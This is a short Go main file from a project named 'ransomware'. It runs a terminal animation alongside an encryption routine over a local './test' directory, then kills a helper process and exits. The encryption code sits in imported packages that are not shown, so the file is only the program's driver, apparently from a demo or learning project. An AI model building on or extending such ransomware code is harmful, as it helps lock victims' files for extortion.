package main

import (
	"os"

	"ransomware/goroutines"
	Terminal "ransomware/terminal"
)

func main() {
	done := make(chan bool)

	terminal := Terminal.NewTerminal()

	directory := "./test"

	go goroutines.GoroutineDonut(terminal)
	go goroutines.GoroutineEncrypt(done, directory)

	// Wait for GoroutineEncrypt to finish
	<-done

	// Get the value of Cmd and kill the process
	cmd := Terminal.GetCmd()
	if cmd != nil && cmd.Process != nil {
		cmd.Process.Kill()
	}

	os.Exit(0)
}
